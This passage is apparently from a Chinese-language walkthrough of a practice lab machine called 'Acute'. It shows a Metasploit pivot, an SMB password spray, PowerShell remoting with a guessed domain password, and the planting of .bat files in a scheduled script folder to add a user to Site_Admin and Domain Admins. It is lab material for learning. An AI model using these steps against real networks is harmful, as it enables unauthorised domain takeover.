<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  60        meterpreter x64/windows  ACUTE\edavies @ ACUTE-PC01  10.10.16.8:10087 -&gt; 10.10.11.145:49878 (172.16.22.2)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; route add 172.16.22.0 255.255.255.0 60</span><br><span class="line">[*] Route added</span><br></pre></td></tr></table></figure>

<p>做一下字典先</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -Eo &#x27;\w+&#x27; userlistt</span><br><span class="line">Administrator</span><br><span class="line">awallace</span><br><span class="line">chall</span><br><span class="line">edavies</span><br><span class="line">Guest</span><br><span class="line">imonks</span><br><span class="line">jmorgan</span><br><span class="line">krbtgt</span><br><span class="line">lhopkins</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_login) &gt; set user_file userlistt</span><br><span class="line">user_file =&gt; userlistt</span><br></pre></td></tr></table></figure>

<p>发现直接跑好像有点问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sf6 auxiliary(scanner/smb/smb_login) &gt; set SMBDomain &#x27;acute.local&#x27;</span><br><span class="line">SMBDomain =&gt; acute.local</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_login) &gt; rerun</span><br><span class="line">[*] Reloading module...</span><br><span class="line">[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session</span><br><span class="line"></span><br><span class="line">[*] 172.16.22.1:445       - 172.16.22.1:445 - Starting SMB login bruteforce</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\Administrator:Password@123&#x27;,</span><br><span class="line">[!] 172.16.22.1:445       - No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\awallace:Password@123&#x27;,</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\chall:Password@123&#x27;,</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\edavies:Password@123&#x27;,</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\Guest:Password@123&#x27;,</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\imonks:Password@123&#x27;,</span><br><span class="line">[-] 172.16.22.1:445       - 172.16.22.1:445 - Failed: &#x27;acute.local\jmorgan:Password@123&#x27;,</span><br></pre></td></tr></table></figure>

<p>还是手动invoke-command挨个试了</p>
<p>好消息是awallace就撞到了，没有浪费时间</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsplainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;acute\awallace&quot;</span>,<span class="variable">$passwd</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> ~ &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jmorgan\Documents&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; net user /domain</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ScriptBlock</span> &#123; net user /domain&#125;</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            awallace                 chall                    </span><br><span class="line">edavies                  Guest                    imonks                   </span><br><span class="line">jmorgan                  krbtgt                   lhopkins                 </span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure>

<p>看了下权限，引起注意的是当前用户在一个<code>Managers</code>组里，是个自定义组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\jmorgan\Documents&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;whoami /all&#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;whoami /all&#125;</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name      SID                                           </span><br><span class="line">============== ==============================================</span><br><span class="line">acute\awallace S-1-5-21-1786406921-1914792807-2072761762-1104</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes                                        </span><br><span class="line">========================================== ================ ============================================== ==================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">ACUTE\Managers                             Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State  </span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br></pre></td></tr></table></figure>

<p>然后再搜点，但这次用户的家目录下没有东西了。</p>
<p>因为这个用户的组别比较特殊，所以应该是给了啥特殊权限</p>
<p>这里到<code>Program Files</code>看到有个<code>keepmeon</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jmorgan\Documents&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> <span class="string">&quot;\Program Files&quot;</span>&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> <span class="string">&quot;\Program Files&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                               <span class="literal">--------------</span>                    </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">21</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">00</span>:<span class="number">04</span>                common files                       ATSSERVER                         </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">21</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">00</span>:<span class="number">11</span>                Hyper<span class="literal">-V</span>                            ATSSERVER                         </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">15</span>/<span class="number">09</span>/<span class="number">2018</span>     <span class="number">08</span>:<span class="number">12</span>                internet explorer                  ATSSERVER                         </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">01</span>/<span class="number">02</span>/<span class="number">2022</span>     <span class="number">19</span>:<span class="number">41</span>                keepmeon                           ATSSERVER                         </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">21</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">00</span>:<span class="number">04</span>                VMware                             ATSSERVER                         </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">20</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">21</span>:<span class="number">19</span>                Windows Defender                   ATSSERVER                         </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">20</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">21</span>:<span class="number">12</span>                Windows Defender Advanced Threat   ATSSERVER                         </span><br><span class="line">                                                  Protection                                                           </span><br><span class="line">d<span class="literal">-----</span>        <span class="number">21</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">14</span>:<span class="number">13</span>                WindowsPowerShell                  ATSSERVER</span><br></pre></td></tr></table></figure>

<p>“让他继续”说是（x</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-15.png" alt="alt text"></p>
<p>其中包含了一个文件<code>keepmeon.bat </code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jmorgan\Documents&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> <span class="string">&quot;\Program Files\keepmeon&quot;</span>&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">ls</span> <span class="string">&quot;\Program Files\keepmeon&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\keepmeon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                               <span class="literal">--------------</span>                    </span><br><span class="line"><span class="literal">-a----</span>        <span class="number">21</span>/<span class="number">12</span>/<span class="number">2021</span>     <span class="number">14</span>:<span class="number">57</span>            <span class="number">128</span> keepmeon.bat                       ATSSERVER </span><br></pre></td></tr></table></figure>

<p>查看内容是个脚本，会执行所有的bat后缀的文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jmorgan\Documents&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">cat</span> <span class="string">&quot;\Program Files\keepmeon\keepmeon.bat&quot;</span>&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">cat</span> <span class="string">&quot;\Program Files\keepmeon\keepmeon.bat&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">REM This is run every <span class="number">5</span> minutes. <span class="keyword">For</span> Lois use ONLY</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"> <span class="keyword">for</span> /<span class="built_in">R</span> %%x <span class="keyword">in</span> (*.bat) <span class="keyword">do</span> (</span><br><span class="line"> <span class="keyword">if</span> not <span class="string">&quot;%%x&quot;</span> == <span class="string">&quot;%~0&quot;</span> call <span class="string">&quot;%%x&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里说每过五分钟会执行一次，而且看样子是是由Lois来执行</p>
<blockquote>
<p>REM This is run every 5 minutes. For Lois use ONLY</p>
</blockquote>
<p>那先看下lois是啥用户，这里先列出所有用户然后挨个看下信息，找找lois</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;net users /domain&#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;net users /domain&#125;</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            awallace                 chall                    </span><br><span class="line">edavies                  Guest                    imonks                   </span><br><span class="line">jmorgan                  krbtgt                   lhopkins                 </span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure>

<p>直到<code>lhopkins</code>找到了这个b，但是这个b<code>Lois</code>只是个普通域用户..</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;net user lhopkins  /domain&#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123;net user lhopkins  /domain&#125;</span><br><span class="line">User name                    lhopkins</span><br><span class="line">Full Name                    Lois Hopkins</span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            21/12/2021 14:51:53</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          22/12/2021 14:51:53</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     No</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   14/03/2025 13:38:26</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      </span><br><span class="line">Global Group memberships     *Domain Users         </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p><strong>不过还记得文档里记载的这段话：</strong></p>
<p><strong>只有lois有权限修改组成员，要改的话联系他，只有lois可以成为<code>site admin（站点管理员）</code></strong></p>
<blockquote>
<p>Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin.</p>
</blockquote>
<p>好奇这个<code>site admin</code>代表的啥，看了下组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123;net groups /domain&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">*Cloneable Domain Controllers</span><br><span class="line">*DnsUpdateProxy</span><br><span class="line">*Domain Admins</span><br><span class="line">*Domain Computers</span><br><span class="line">*Domain Controllers</span><br><span class="line">*Domain Guests</span><br><span class="line">*Domain Users</span><br><span class="line">*Enterprise Admins</span><br><span class="line">*Enterprise Key Admins</span><br><span class="line">*Enterprise <span class="built_in">Read-only</span> Domain Controllers</span><br><span class="line">*<span class="built_in">Group</span> Policy Creator Owners</span><br><span class="line">*Key Admins</span><br><span class="line">*Managers</span><br><span class="line">*Protected Users</span><br><span class="line">*<span class="built_in">Read-only</span> Domain Controllers</span><br><span class="line">*Schema Admins</span><br><span class="line">*Site_Admin</span><br><span class="line">The command completed with one or more errors</span><br></pre></td></tr></table></figure>

<p>其中有一个<code>*Site_Admin</code>组别</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\utils&gt;  <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123;net <span class="built_in">group</span> Site_Admin /domain&#125;</span><br><span class="line"> <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage  <span class="literal">-ScriptBlock</span> &#123;net <span class="built_in">group</span> Site_Admin /domain&#125;</span><br><span class="line"><span class="built_in">Group</span> name     Site_Admin</span><br><span class="line">Comment        Only <span class="keyword">in</span> the event of emergencies is this to be populated. This has access to Domain Admin <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>留了一个备注给这个组，只有紧急情况才让用这个组，然后这个组可以操作<code>domain admins</code>说是</p>
<blockquote>
<p>Only in the event of emergencies is this to be populated. This has access to Domain Admin group</p>
</blockquote>
<p>梳理一下手里的几个掌握的点</p>
<ul>
<li>1.<code>keepmeon.bat</code>每过5分钟Lois可能会执行这个脚本，来用它执行其他bat</li>
<li>2.只有Lois才可以成为site admin</li>
<li>3.site_admin组可以操作<code>domain admins</code></li>
</ul>
<p>虽然<code>lhopkins</code>账户是普通的domain user，但我怀疑她每过5分钟都会给赋予<code>site admin</code>权限,然后执行bat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential <span class="variable">$cred</span> -ConfigurationName dc_manage  -ScriptBlock &#123;net user lhopkins  /domain&#125;</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential <span class="variable">$cred</span> -ConfigurationName dc_manage  -ScriptBlock &#123;net user lhopkins  /domain&#125;</span><br><span class="line">User name                    lhopkins</span><br><span class="line">Full Name                    Lois Hopkins</span><br><span class="line">Comment                      </span><br><span class="line">User<span class="string">&#x27;s comment               </span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            21/12/2021 14:51:53</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          22/12/2021 14:51:53</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script                 </span></span><br><span class="line"><span class="string">User profile                 </span></span><br><span class="line"><span class="string">Home directory               </span></span><br><span class="line"><span class="string">Last logon                   14/03/2025 13:58:26</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      </span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users         </span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS C:\utils&gt; </span></span><br><span class="line"><span class="string">PS C:\utils&gt; date</span></span><br><span class="line"><span class="string">date</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">14 March 2025 14:01:27</span></span><br></pre></td></tr></table></figure>

<p>所以我蹲着等他5分钟上线抓他的用户组别，然后等了5分钟之后他的组别还是只有<code>domain users</code>，所以这个用户并不会被赋予<code>site_admin</code>权限。</p>
<p>但<code>doc</code>中又明确说了<code>lois</code>是能更改用户的组别，所以干脆直接尝试下。</p>
<p>于是我写了个bat，因为他每过5分钟执行bat，把当前知道凭证且能访问<code>atsserver</code>的用户加个组测测，这里用<code>awallace 、imonks</code>都可以，我选的<code>awallace</code></p>
<p>写了仨bat</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Program Files\keepmeon\as.bat&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;net group site_admin awallace /add /domain&quot;</span> &#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Program Files\keepmeon\asss.bat&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;net group &#x27;domain admins&#x27; awallace /add /domain&quot;</span> &#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Set-Content</span> <span class="literal">-Path</span> <span class="string">&quot;C:\Program Files\keepmeon\ass.bat&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;net group &#x27;key admins&#x27; awallace /add /domain&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<p>等了一会之后，发现<code>awallace</code>被加了个<code>Site_Admin</code>，说明<code>bak</code>是运行了，但奇怪的是加<code>domain admins</code>和<code>key admins</code>的却没执行似的。</p>
